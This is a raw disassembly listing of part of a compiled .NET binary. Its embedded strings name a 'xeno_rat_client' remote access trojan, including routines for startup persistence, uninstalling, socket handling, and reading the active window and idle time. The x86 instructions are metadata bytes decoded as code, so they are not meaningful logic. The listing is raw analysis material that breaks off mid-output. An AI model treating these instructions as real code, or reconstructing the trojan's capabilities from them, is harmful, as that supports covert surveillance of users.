  40cf11:	73 79                	jae    0x40cf8c
  40cf13:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf14:	63 3e                	arpl   %edi,(%esi)
  40cf16:	64 5f                	fs pop %edi
  40cf18:	5f                   	pop    %edi
  40cf19:	39 00                	cmp    %eax,(%eax)
  40cf1b:	00 36                	add    %dh,(%esi)
  40cf1d:	01 00                	add    %eax,(%eax)
  40cf1f:	31 78 65             	xor    %edi,0x65(%eax)
  40cf22:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf23:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf24:	5f                   	pop    %edi
  40cf25:	72 61                	jb     0x40cf88
  40cf27:	74 5f                	je     0x40cf88
  40cf29:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cf2d:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf2e:	74 2e                	je     0x40cf5e
  40cf30:	53                   	push   %ebx
  40cf31:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf32:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40cf35:	74 48                	je     0x40cf7f
  40cf37:	61                   	popa
  40cf38:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf39:	64 6c                	fs insb (%dx),%es:(%edi)
  40cf3b:	65 72 2b             	gs jb  0x40cf69
  40cf3e:	3c 52                	cmp    $0x52,%al
  40cf40:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40cf44:	76 65                	jbe    0x40cfab
  40cf46:	41                   	inc    %ecx
  40cf47:	73 79                	jae    0x40cfc2
  40cf49:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf4a:	63 3e                	arpl   %edi,(%esi)
  40cf4c:	64 5f                	fs pop %edi
  40cf4e:	5f                   	pop    %edi
  40cf4f:	31 30                	xor    %esi,(%eax)
  40cf51:	00 00                	add    %al,(%eax)
  40cf53:	28 01                	sub    %al,(%ecx)
  40cf55:	00 23                	add    %ah,(%ebx)
  40cf57:	78 65                	js     0x40cfbe
  40cf59:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf5a:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf5b:	5f                   	pop    %edi
  40cf5c:	72 61                	jb     0x40cfbf
  40cf5e:	74 5f                	je     0x40cfbf
  40cf60:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cf64:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf65:	74 2e                	je     0x40cf95
  40cf67:	50                   	push   %eax
  40cf68:	72 6f                	jb     0x40cfd9
  40cf6a:	67 72 61             	addr16 jb 0x40cfce
  40cf6d:	6d                   	insl   (%dx),%es:(%edi)
  40cf6e:	2b 3c 4d 61 69 6e 3e 	sub    0x3e6e6961(,%ecx,2),%edi
  40cf75:	64 5f                	fs pop %edi
  40cf77:	5f                   	pop    %edi
  40cf78:	31 31                	xor    %esi,(%ecx)
  40cf7a:	00 00                	add    %al,(%eax)
  40cf7c:	3e 01 00             	add    %eax,%ds:(%eax)
  40cf7f:	39 78 65             	cmp    %edi,0x65(%eax)
  40cf82:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf83:	6f                   	outsl  %ds:(%esi),(%dx)
  40cf84:	5f                   	pop    %edi
  40cf85:	72 61                	jb     0x40cfe8
  40cf87:	74 5f                	je     0x40cfe8
  40cf89:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cf8d:	6e                   	outsb  %ds:(%esi),(%dx)
  40cf8e:	74 2e                	je     0x40cfbe
  40cf90:	55                   	push   %ebp
  40cf91:	74 69                	je     0x40cffc
  40cf93:	6c                   	insb   (%dx),%es:(%edi)
  40cf94:	73 2b                	jae    0x40cfc1
  40cf96:	3c 47                	cmp    $0x47,%al
  40cf98:	65 74 43             	gs je  0x40cfde
  40cf9b:	61                   	popa
  40cf9c:	70 74                	jo     0x40d012
  40cf9e:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  40cfa5:	74 69                	je     0x40d010
  40cfa7:	76 65                	jbe    0x40d00e
  40cfa9:	57                   	push   %edi
  40cfaa:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  40cfb1:	79 6e                	jns    0x40d021
  40cfb3:	63 3e                	arpl   %edi,(%esi)
  40cfb5:	64 5f                	fs pop %edi
  40cfb7:	5f                   	pop    %edi
  40cfb8:	38 00                	cmp    %al,(%eax)
  40cfba:	00 36                	add    %dh,(%esi)
  40cfbc:	01 00                	add    %eax,(%eax)
  40cfbe:	31 78 65             	xor    %edi,0x65(%eax)
  40cfc1:	6e                   	outsb  %ds:(%esi),(%dx)
  40cfc2:	6f                   	outsl  %ds:(%esi),(%dx)
  40cfc3:	5f                   	pop    %edi
  40cfc4:	72 61                	jb     0x40d027
  40cfc6:	74 5f                	je     0x40d027
  40cfc8:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40cfcc:	6e                   	outsb  %ds:(%esi),(%dx)
  40cfcd:	74 2e                	je     0x40cffd
  40cfcf:	55                   	push   %ebp
  40cfd0:	74 69                	je     0x40d03b
  40cfd2:	6c                   	insb   (%dx),%es:(%edi)
  40cfd3:	73 2b                	jae    0x40d000
  40cfd5:	3c 43                	cmp    $0x43,%al
  40cfd7:	6f                   	outsl  %ds:(%esi),(%dx)
  40cfd8:	6e                   	outsb  %ds:(%esi),(%dx)
  40cfd9:	6e                   	outsb  %ds:(%esi),(%dx)
  40cfda:	65 63 74 41 6e       	arpl   %esi,%gs:0x6e(%ecx,%eax,2)
  40cfdf:	64 53                	fs push %ebx
  40cfe1:	65 74 75             	gs je  0x40d059
  40cfe4:	70 41                	jo     0x40d027
  40cfe6:	73 79                	jae    0x40d061
  40cfe8:	6e                   	outsb  %ds:(%esi),(%dx)
  40cfe9:	63 3e                	arpl   %edi,(%esi)
  40cfeb:	64 5f                	fs pop %edi
  40cfed:	5f                   	pop    %edi
  40cfee:	31 35 00 00 2f 01    	xor    %esi,0x12f0000
  40cff4:	00 2a                	add    %ch,(%edx)
  40cff6:	78 65                	js     0x40d05d
  40cff8:	6e                   	outsb  %ds:(%esi),(%dx)
  40cff9:	6f                   	outsl  %ds:(%esi),(%dx)
  40cffa:	5f                   	pop    %edi
  40cffb:	72 61                	jb     0x40d05e
  40cffd:	74 5f                	je     0x40d05e
  40cfff:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40d003:	6e                   	outsb  %ds:(%esi),(%dx)
  40d004:	74 2e                	je     0x40d034
  40d006:	55                   	push   %ebp
  40d007:	74 69                	je     0x40d072
  40d009:	6c                   	insb   (%dx),%es:(%edi)
  40d00a:	73 2b                	jae    0x40d037
  40d00c:	3c 52                	cmp    $0x52,%al
  40d00e:	65 6d                	gs insl (%dx),%es:(%edi)
  40d010:	6f                   	outsl  %ds:(%esi),(%dx)
  40d011:	76 65                	jbe    0x40d078
  40d013:	53                   	push   %ebx
  40d014:	74 61                	je     0x40d077
  40d016:	72 74                	jb     0x40d08c
  40d018:	75 70                	jne    0x40d08a
  40d01a:	3e 64 5f             	ds fs pop %edi
  40d01d:	5f                   	pop    %edi
  40d01e:	31 36                	xor    %esi,(%esi)
  40d020:	00 00                	add    %al,(%eax)
  40d022:	2b 01                	sub    (%ecx),%eax
  40d024:	00 26                	add    %ah,(%esi)
  40d026:	78 65                	js     0x40d08d
  40d028:	6e                   	outsb  %ds:(%esi),(%dx)
  40d029:	6f                   	outsl  %ds:(%esi),(%dx)
  40d02a:	5f                   	pop    %edi
  40d02b:	72 61                	jb     0x40d08e
  40d02d:	74 5f                	je     0x40d08e
  40d02f:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40d033:	6e                   	outsb  %ds:(%esi),(%dx)
  40d034:	74 2e                	je     0x40d064
  40d036:	55                   	push   %ebp
  40d037:	74 69                	je     0x40d0a2
  40d039:	6c                   	insb   (%dx),%es:(%edi)
  40d03a:	73 2b                	jae    0x40d067
  40d03c:	3c 55                	cmp    $0x55,%al
  40d03e:	6e                   	outsb  %ds:(%esi),(%dx)
  40d03f:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  40d046:	3e 64 5f             	ds fs pop %edi
  40d049:	5f                   	pop    %edi
  40d04a:	31 37                	xor    %esi,(%edi)
  40d04c:	00 00                	add    %al,(%eax)
  40d04e:	36 01 00             	add    %eax,%ss:(%eax)
  40d051:	31 78 65             	xor    %edi,0x65(%eax)
  40d054:	6e                   	outsb  %ds:(%esi),(%dx)
  40d055:	6f                   	outsl  %ds:(%esi),(%dx)
  40d056:	5f                   	pop    %edi
  40d057:	72 61                	jb     0x40d0ba
  40d059:	74 5f                	je     0x40d0ba
  40d05b:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40d05f:	6e                   	outsb  %ds:(%esi),(%dx)
  40d060:	74 2e                	je     0x40d090
  40d062:	55                   	push   %ebp
  40d063:	74 69                	je     0x40d0ce
  40d065:	6c                   	insb   (%dx),%es:(%edi)
  40d066:	73 2b                	jae    0x40d093
  40d068:	3c 41                	cmp    $0x41,%al
  40d06a:	64 64 54             	fs fs push %esp
  40d06d:	6f                   	outsl  %ds:(%esi),(%dx)
  40d06e:	53                   	push   %ebx
  40d06f:	74 61                	je     0x40d0d2
  40d071:	72 74                	jb     0x40d0e7
  40d073:	75 70                	jne    0x40d0e5
  40d075:	4e                   	dec    %esi
  40d076:	6f                   	outsl  %ds:(%esi),(%dx)
  40d077:	6e                   	outsb  %ds:(%esi),(%dx)
  40d078:	41                   	inc    %ecx
  40d079:	64 6d                	fs insl (%dx),%es:(%edi)
  40d07b:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40d082:	38 00                	cmp    %al,(%eax)
  40d084:	00 33                	add    %dh,(%ebx)
  40d086:	01 00                	add    %eax,(%eax)
  40d088:	2e 78 65             	js,pn  0x40d0f0
  40d08b:	6e                   	outsb  %ds:(%esi),(%dx)
  40d08c:	6f                   	outsl  %ds:(%esi),(%dx)
  40d08d:	5f                   	pop    %edi
  40d08e:	72 61                	jb     0x40d0f1
  40d090:	74 5f                	je     0x40d0f1
  40d092:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40d096:	6e                   	outsb  %ds:(%esi),(%dx)
  40d097:	74 2e                	je     0x40d0c7
  40d099:	55                   	push   %ebp
  40d09a:	74 69                	je     0x40d105
  40d09c:	6c                   	insb   (%dx),%es:(%edi)
  40d09d:	73 2b                	jae    0x40d0ca
  40d09f:	3c 41                	cmp    $0x41,%al
  40d0a1:	64 64 54             	fs fs push %esp
  40d0a4:	6f                   	outsl  %ds:(%esi),(%dx)
  40d0a5:	53                   	push   %ebx
  40d0a6:	74 61                	je     0x40d109
  40d0a8:	72 74                	jb     0x40d11e
  40d0aa:	75 70                	jne    0x40d11c
  40d0ac:	41                   	inc    %ecx
  40d0ad:	64 6d                	fs insl (%dx),%es:(%edi)
  40d0af:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40d0b6:	39 00                	cmp    %eax,(%eax)
  40d0b8:	00 32                	add    %dh,(%edx)
  40d0ba:	01 00                	add    %eax,(%eax)
  40d0bc:	2d 78 65 6e 6f       	sub    $0x6f6e6578,%eax
  40d0c1:	5f                   	pop    %edi
  40d0c2:	72 61                	jb     0x40d125
  40d0c4:	74 5f                	je     0x40d125
  40d0c6:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40d0ca:	6e                   	outsb  %ds:(%esi),(%dx)
  40d0cb:	74 2e                	je     0x40d0fb
  40d0cd:	55                   	push   %ebp
  40d0ce:	74 69                	je     0x40d139
  40d0d0:	6c                   	insb   (%dx),%es:(%edi)
  40d0d1:	73 2b                	jae    0x40d0fe
  40d0d3:	3c 47                	cmp    $0x47,%al
  40d0d5:	65 74 49             	gs je  0x40d121
  40d0d8:	64 6c                	fs insb (%dx),%es:(%edi)
  40d0da:	65 54                	gs push %esp
  40d0dc:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  40d0e3:	63 3e                	arpl   %edi,(%esi)
  40d0e5:	64 5f                	fs pop %edi
  40d0e7:	5f                   	pop    %edi
  40d0e8:	32 30                	xor    (%eax),%dh
  40d0ea:	00 00                	add    %al,(%eax)
  40d0ec:	08 07                	or     %al,(%edi)
  40d0ee:	05 1d 05 09 09       	add    $0x909051d,%eax
  40d0f3:	08 18                	or     %bl,(%eax)
  40d0f5:	04 20                	add    $0x20,%al
  40d0f7:	01 01                	add    %eax,(%ecx)
  40d0f9:	0a 09                	or     (%ecx),%cl
  40d0fb:	10 01                	adc    %al,(%ecx)
  40d0fd:	02 01                	add    (%ecx),%al
  40d0ff:	10 1d 1e 00 08 03    	adc    %bl,0x308001e
  40d105:	0a 01                	or     (%ecx),%al
  40d107:	05 05 07 02 08       	add    $0x8020705,%eax
  40d10c:	1d 05 07 15 12       	sbb    $0x12150705,%eax
  40d111:	09 02                	or     %eax,(%edx)
  40d113:	0e                   	push   %cs
  40d114:	12 0d 05 00 00 12    	adc    0x12000005,%cl
  40d11a:	80 c5 05             	add    $0x5,%ch
  40d11d:	20 02                	and    %al,(%edx)
  40d11f:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40d122:	06                   	push   %es
  40d123:	20 01                	and    %al,(%ecx)
  40d125:	01 12                	add    %edx,(%edx)
  40d127:	80 c9 04             	or     $0x4,%cl
  40d12a:	07                   	pop    %es
  40d12b:	01 11                	add    %edx,(%ecx)
  40d12d:	10 04 00             	adc    %al,(%eax,%eax,1)
  40d130:	00 11                	add    %dl,(%ecx)
  40d132:	21 07                	and    %eax,(%edi)
  40d134:	30 01                	xor    %al,(%ecx)
  40d136:	01 01                	add    %eax,(%ecx)
  40d138:	10 1e                	adc    %bl,(%esi)
  40d13a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40d13d:	01 11                	add    %edx,(%ecx)
  40d13f:	10 05 00 02 02 0e    	adc    %al,0xe020200
  40d145:	0e                   	push   %cs
  40d146:	04 00                	add    $0x0,%al
  40d148:	00 12                	add    %dl,(%edx)
  40d14a:	0d 1c 07 0b 08       	or     $0x80b071c,%eax
  40d14f:	12 0c 1d 05 1c 15 11 	adc    0x11151c05(,%ebx,1),%cl
  40d156:	25 01 1d 05 1d       	and    $0x1d051d01,%eax
  40d15b:	05 15 11 25 01       	add    $0x1251115,%eax
  40d160:	02 11                	add    (%ecx),%dl
  40d162:	29 12                	sub    %edx,(%edx)
  40d164:	2d 08 12 2d 06       	sub    $0x62d1208,%eax
  40d169:	15 12 39 01 1d       	adc    $0x1d013912,%eax
  40d16e:	05 08 20 00 15       	add    $0x15002008,%eax
  40d173:	11 25 01 13 00 06    	adc    %esp,0x6001301
  40d179:	15 11 25 01 1d       	adc    $0x1d012511,%eax
  40d17e:	05 0a 30 02 02       	add    $0x202300a,%eax
  40d183:	01 10                	add    %edx,(%eax)
  40d185:	1e                   	push   %ds
  40d186:	00 10                	add    %dl,(%eax)
  40d188:	1e                   	push   %ds
  40d189:	01 0a                	add    %ecx,(%edx)
  40d18b:	0a 02                	or     (%edx),%al
  40d18d:	15 11 25 01 1d       	adc    $0x1d012511,%eax
  40d192:	05 11 10 04 20       	add    $0x20041011,%eax
  40d197:	00 13                	add    %dl,(%ebx)
  40d199:	00 04 00             	add    %al,(%eax,%eax,1)
  40d19c:	00 12                	add    %dl,(%edx)
  40d19e:	61                   	popa
  40d19f:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  40d1a4:	05 04 00 01 01       	add    $0x1010004,%eax
  40d1a9:	0e                   	push   %cs
  40d1aa:	05 20 01 02 13       	add    $0x13020120,%eax
  40d1af:	00 05 15 12 39 01    	add    %al,0x1391215
  40d1b5:	02 05 15 11 25 01    	add    0x1251115,%al
  40d1bb:	02 09                	add    (%ecx),%cl
  40d1bd:	0a 02                	or     (%edx),%al
  40d1bf:	15 11 25 01 02       	adc    $0x2012511,%eax
  40d1c4:	11 10                	adc    %edx,(%eax)
  40d1c6:	04 00                	add    $0x0,%al
  40d1c8:	01 01                	add    %eax,(%ecx)
  40d1ca:	08 06                	or     %al,(%esi)
  40d1cc:	00 01                	add    %al,(%ecx)
  40d1ce:	12 0d 1d 05 07 20    	adc    0x2007051d,%cl
  40d1d4:	02 01                	add    (%ecx),%al
  40d1d6:	13 00                	adc    (%eax),%eax
  40d1d8:	13 01                	adc    (%ecx),%eax
  40d1da:	06                   	push   %es
  40d1db:	20 01                	and    %al,(%ecx)
  40d1dd:	13 01                	adc    (%ecx),%eax
  40d1df:	13 00                	adc    (%eax),%eax
  40d1e1:	06                   	push   %es
  40d1e2:	20 01                	and    %al,(%ecx)
  40d1e4:	12 80 ad 0e 06 00    	adc    0x60ead(%eax),%al
  40d1ea:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40d1ed:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  40d1f4:	ad                   	lods   %ds:(%esi),%eax
  40d1f5:	09 20                	or     %esp,(%eax)
  40d1f7:	02 12                	add    (%edx),%dl
  40d1f9:	80 dd 0e             	sbb    $0xe,%ch
  40d1fc:	11 80 e1 06 20 02    	adc    %eax,0x22006e1(%eax)
  40d202:	1c 1c                	sbb    $0x1c,%al
  40d204:	1d 1c 04 20 00       	sbb    $0x20041c,%eax
  40d209:	11 29                	adc    %ebp,(%ecx)
  40d20b:	06                   	push   %es
  40d20c:	0a 02                	or     (%edx),%al
  40d20e:	11 29                	adc    %ebp,(%ecx)
  40d210:	11 10                	adc    %edx,(%eax)
  40d212:	05 20 01 1d 05       	add    $0x51d0120,%eax
  40d217:	0e                   	push   %cs
  40d218:	05 20 01 01 12       	add    $0x12010120,%eax
  40d21d:	2d 12 07 06 1d       	sub    $0x1d060712,%eax
  40d222:	05 1d 05 12 80       	add    $0x8012051d,%eax
  40d227:	e9 12 80 ed 12       	jmp    0x132e523e
  40d22c:	80 f1 12             	xor    $0x12,%cl
  40d22f:	80 f5 05             	xor    $0x5,%ch
  40d232:	00 00                	add    %al,(%eax)
  40d234:	12 80 e9 05 20 01    	adc    0x12005e9(%eax),%al
  40d23a:	01 1d 05 04 20 00    	add    %ebx,0x200405
  40d240:	1d 05 09 20 02       	sbb    $0x2200905,%eax
  40d245:	12 80 ed 1d 05 1d    	adc    0x1d051ded(%eax),%al
  40d24b:	05 0c 20 03 01       	add    $0x103200c,%eax
  40d250:	12 80 fd 12 80 ed    	adc    -0x127fed03(%eax),%al
  40d256:	11 81 01 07 20 03    	adc    %eax,0x3200701(%ecx)
  40d25c:	01 1d 05 08 08 04    	add    %ebx,0x4080805
  40d262:	07                   	pop    %es
  40d263:	01 11                	add    %edx,(%ecx)
  40d265:	1c 04                	sbb    $0x4,%al
  40d267:	0a 01                	or     (%ecx),%al
  40d269:	11 1c 04             	adc    %ebx,(%esp,%eax,1)
  40d26c:	07                   	pop    %es
  40d26d:	01 11                	add    %edx,(%ecx)
  40d26f:	20 04 0a             	and    %al,(%edx,%ecx,1)
  40d272:	01 11                	add    %edx,(%ecx)
  40d274:	20 04 07             	and    %al,(%edi,%eax,1)
  40d277:	01 11                	add    %edx,(%ecx)
  40d279:	24 04                	and    $0x4,%al
  40d27b:	0a 01                	or     (%ecx),%al
  40d27d:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40d280:	07                   	pop    %es
  40d281:	01 11                	add    %edx,(%ecx)
  40d283:	28 04 0a             	sub    %al,(%edx,%ecx,1)
  40d286:	01 11                	add    %edx,(%ecx)
  40d288:	28 04 07             	sub    %al,(%edi,%eax,1)
  40d28b:	01 11                	add    %edx,(%ecx)
  40d28d:	2c 04                	sub    $0x4,%al
  40d28f:	0a 01                	or     (%ecx),%al
  40d291:	11 2c 04             	adc    %ebp,(%esp,%eax,1)
  40d294:	07                   	pop    %es
  40d295:	01 11                	add    %edx,(%ecx)
  40d297:	30 04 0a             	xor    %al,(%edx,%ecx,1)
  40d29a:	01 11                	add    %edx,(%ecx)
  40d29c:	30 04 07             	xor    %al,(%edi,%eax,1)
  40d29f:	01 11                	add    %edx,(%ecx)
  40d2a1:	34 04                	xor    $0x4,%al
  40d2a3:	0a 01                	or     (%ecx),%al
  40d2a5:	11 34 04             	adc    %esi,(%esp,%eax,1)
  40d2a8:	07                   	pop    %es
  40d2a9:	01 11                	add    %edx,(%ecx)
  40d2ab:	38 04 0a             	cmp    %al,(%edx,%ecx,1)
  40d2ae:	01 11                	add    %edx,(%ecx)
  40d2b0:	38 13                	cmp    %dl,(%ebx)
  40d2b2:	07                   	pop    %es
  40d2b3:	08 08                	or     %cl,(%eax)
  40d2b5:	12 18                	adc    (%eax),%bl
  40d2b7:	08 08                	or     %cl,(%eax)
  40d2b9:	12 3c 15 11 25 01 12 	adc    0x12012511(,%edx,1),%bh
  40d2c0:	3c 11                	cmp    $0x11,%al
  40d2c2:	29 12                	sub    %edx,(%edx)
  40d2c4:	2d 06 15 12 31       	sub    $0x31121506,%eax
  40d2c9:	01 12                	add    %edx,(%edx)
  40d2cb:	3c 06                	cmp    $0x6,%al
  40d2cd:	15 12 39 01 12       	adc    $0x12013912,%eax
  40d2d2:	3c 06                	cmp    $0x6,%al
  40d2d4:	15 11 25 01 12       	adc    $0x12012511,%eax
  40d2d9:	3c 0a                	cmp    $0xa,%al
  40d2db:	0a 02                	or     (%edx),%al
  40d2dd:	15 11 25 01 12       	adc    $0x12012511,%eax
  40d2e2:	3c 11                	cmp    $0x11,%al
  40d2e4:	1c 06                	sbb    $0x6,%al
  40d2e6:	0a 02                	or     (%edx),%al
  40d2e8:	11 29                	adc    %ebp,(%ecx)
  40d2ea:	11 1c 05 00 02 0e 0e 	adc    %ebx,0xe0e0200(,%eax,1)
  40d2f1:	0e                   	push   %cs
  40d2f2:	15 07 0a 08 0e       	adc    $0xe080a07,%eax
  40d2f7:	1d 0e 1d 05 1d       	sbb    $0x1d051d0e,%eax
  40d2fc:	05 02 08 1d 05       	add    $0x51d0802,%eax
  40d301:	15 11 25 01 02       	adc    $0x2012511,%eax
  40d306:	12 2d 05 00 00 12    	adc    0x12000005,%ch
  40d30c:	81 0d 09 0a 02 15 11 	orl    $0x2012511,0x15020a09
  40d313:	25 01 02 
  40d316:	11 20                	adc    %esp,(%eax)
  40d318:	12 07                	adc    (%edi),%al
  40d31a:	07                   	pop    %es
  40d31b:	08 12                	or     %dl,(%edx)
  40d31d:	18 1d 05 08 15 11    	sbb    %bl,0x11150805
  40d323:	25 01 1d 05 11       	and    $0x11051d01,%eax
  40d328:	29 12                	sub    %edx,(%edx)
  40d32a:	2d 0a 0a 02 15       	sub    $0x15020a0a,%eax
  40d32f:	11 25 01 1d 05 11    	adc    %esp,0x11051d01
  40d335:	24 06                	and    $0x6,%al
  40d337:	0a 02                	or     (%edx),%al
  40d339:	11 29                	adc    %ebp,(%ecx)
  40d33b:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40d33e:	00 00                	add    %al,(%eax)
  40d340:	12 69 05             	adc    0x5(%ecx),%ch
  40d343:	00 01                	add    %al,(%ecx)
  40d345:	12 69 0e             	adc    0xe(%ecx),%ch
  40d348:	16                   	push   %ss
  40d349:	07                   	pop    %es
  40d34a:	07                   	pop    %es
  40d34b:	08 12                	or     %dl,(%edx)
  40d34d:	18 1d 05 11 29 15    	sbb    %bl,0x15291105
  40d353:	11 25 01 1d 05 15    	adc    %esp,0x15051d01
  40d359:	11 25 01 02 12 2d    	adc    %esp,0x2d120201
  40d35f:	05 00 01 12 11       	add    $0x11120100,%eax
  40d364:	08 06                	or     %al,(%esi)
  40d366:	0a 02                	or     (%edx),%al
  40d368:	11 29                	adc    %ebp,(%ecx)
  40d36a:	11 28                	adc    %ebp,(%eax)
  40d36c:	0a 0a                	or     (%edx),%cl
  40d36e:	02 15 11 25 01 1d    	add    0x1d012511,%dl
  40d374:	05 11 28 09 0a       	add    $0xa092811,%eax
  40d379:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d37f:	11 28                	adc    %ebp,(%eax)
  40d381:	0c 07                	or     $0x7,%al
  40d383:	04 08                	add    $0x8,%al
  40d385:	1d 05 15 11 25       	sbb    $0x25111505,%eax
  40d38a:	01 02                	add    %eax,(%edx)
  40d38c:	12 2d 09 0a 02 15    	adc    0x15020a09,%ch
  40d392:	11 25 01 02 11 2c    	adc    %esp,0x2c110201
  40d398:	0a 0a                	or     (%edx),%cl
  40d39a:	02 15 11 25 01 1d    	add    0x1d012511,%dl
  40d3a0:	05 11 30 06 0a       	add    $0xa063011,%eax
  40d3a5:	02 11                	add    (%ecx),%dl
  40d3a7:	29 11                	sub    %edx,(%ecx)
  40d3a9:	30 0f                	xor    %cl,(%edi)
  40d3ab:	07                   	pop    %es
  40d3ac:	07                   	pop    %es
  40d3ad:	08 12                	or     %dl,(%edx)
  40d3af:	18 08                	sbb    %cl,(%eax)
  40d3b1:	0e                   	push   %cs
  40d3b2:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d3b8:	12 2d 0b 20 00 15    	adc    0x1500200b,%ch
  40d3be:	12 81 19 02 13 00    	adc    0x130219(%ecx),%al
  40d3c4:	13 01                	adc    (%ecx),%eax
  40d3c6:	09 00                	or     %eax,(%eax)
  40d3c8:	02 0e                	add    (%esi),%cl
  40d3ca:	0e                   	push   %cs
  40d3cb:	15 12 51 01 0e       	adc    $0xe015112,%eax
  40d3d0:	09 0a                	or     %ecx,(%edx)
  40d3d2:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d3d8:	11 34 10             	adc    %esi,(%eax,%edx,1)
  40d3db:	10 01                	adc    %al,(%ecx)
  40d3dd:	02 15 12 51 01 1e    	add    0x1e015112,%dl
  40d3e3:	00 15 12 51 01 1e    	add    %dl,0x1e015112
  40d3e9:	00 08                	add    %cl,(%eax)
  40d3eb:	0c 10                	or     $0x10,%al
  40d3ed:	01 01                	add    %eax,(%ecx)
  40d3ef:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
  40d3f4:	51                   	push   %ecx
  40d3f5:	01 1e                	add    %ebx,(%esi)
  40d3f7:	00 0c 10             	add    %cl,(%eax,%edx,1)
  40d3fa:	01 02                	add    %eax,(%edx)
  40d3fc:	02 15 12 51 01 1e    	add    0x1e015112,%dl
  40d402:	00 1e                	add    %bl,(%esi)
  40d404:	00 03                	add    %al,(%ebx)
  40d406:	0a 01                	or     (%ecx),%al
  40d408:	0e                   	push   %cs
  40d409:	1a 07                	sbb    (%edi),%al
  40d40b:	0a 08                	or     (%eax),%cl
  40d40d:	0e                   	push   %cs
  40d40e:	0e                   	push   %cs
  40d40f:	1d 05 0e 15 11       	sbb    $0x11150e05,%eax
  40d414:	25 01 0e 15 11       	and    $0x11150e01,%eax
  40d419:	25 01 09 09 15       	and    $0x15090901,%eax
  40d41e:	11 25 01 02 12 2d    	adc    %esp,0x2d120201
  40d424:	05 15 12 39 01       	add    $0x1391215,%eax
  40d429:	0e                   	push   %cs
  40d42a:	05 15 11 25 01       	add    $0x1251115,%eax
  40d42f:	0e                   	push   %cs
  40d430:	09 0a                	or     %ecx,(%edx)
  40d432:	02 15 11 25 01 0e    	add    0xe012511,%dl
  40d438:	11 38                	adc    %edi,(%eax)
  40d43a:	05 15 12 39 01       	add    $0x1391215,%eax
  40d43f:	09 05 15 11 25 01    	or     %eax,0x1251115
  40d445:	09 09                	or     %ecx,(%ecx)
  40d447:	0a 02                	or     (%edx),%al
  40d449:	15 11 25 01 09       	adc    $0x9012511,%eax
  40d44e:	11 38                	adc    %edi,(%eax)
  40d450:	06                   	push   %es
  40d451:	00 03                	add    %al,(%ebx)
  40d453:	0e                   	push   %cs
  40d454:	0e                   	push   %cs
  40d455:	0e                   	push   %cs
  40d456:	0e                   	push   %cs
  40d457:	09 0a                	or     %ecx,(%edx)
  40d459:	02 15 11 25 01 02    	add    0x2012511,%dl
  40d45f:	11 38                	adc    %edi,(%eax)
  40d461:	06                   	push   %es
  40d462:	15 12 35 01 12       	adc    $0x12013512,%eax
  40d467:	3c 05                	cmp    $0x5,%al
  40d469:	20 01                	and    %al,(%ecx)
  40d46b:	01 13                	add    %edx,(%ebx)
  40d46d:	00 04 07             	add    %al,(%edi,%eax,1)
  40d470:	01 11                	add    %edx,(%ecx)
  40d472:	40                   	inc    %eax
  40d473:	04 00                	add    $0x0,%al
  40d475:	00 11                	add    %dl,(%ecx)
  40d477:	3d 04 0a 01 11       	cmp    $0x11010a04,%eax
  40d47c:	40                   	inc    %eax
  40d47d:	04 07                	add    $0x7,%al
  40d47f:	01 11                	add    %edx,(%ecx)
  40d481:	44                   	inc    %esp
  40d482:	06                   	push   %es
  40d483:	15 11 41 01 12       	adc    $0x12014111,%eax
  40d488:	3c 08                	cmp    $0x8,%al
  40d48a:	00 00                	add    %al,(%eax)
  40d48c:	15 11 41 01 13       	adc    $0x13014111,%eax
  40d491:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40d494:	01 11                	add    %edx,(%ecx)
  40d496:	44                   	inc    %esp
  40d497:	08 20                	or     %ah,(%eax)
  40d499:	00 15 12 39 01 13    	add    %dl,0x13013912
  40d49f:	00 03                	add    %al,(%ebx)
  40d4a1:	07                   	pop    %es
  40d4a2:	01 02                	add    %eax,(%edx)
  40d4a4:	04 07                	add    $0x7,%al
  40d4a6:	01 11                	add    %edx,(%ecx)
  40d4a8:	48                   	dec    %eax
  40d4a9:	06                   	push   %es
  40d4aa:	15 11 41 01 1d       	adc    $0x1d014111,%eax
  40d4af:	05 04 0a 01 11       	add    $0x11010a04,%eax
  40d4b4:	48                   	dec    %eax
  40d4b5:	04 07                	add    $0x7,%al
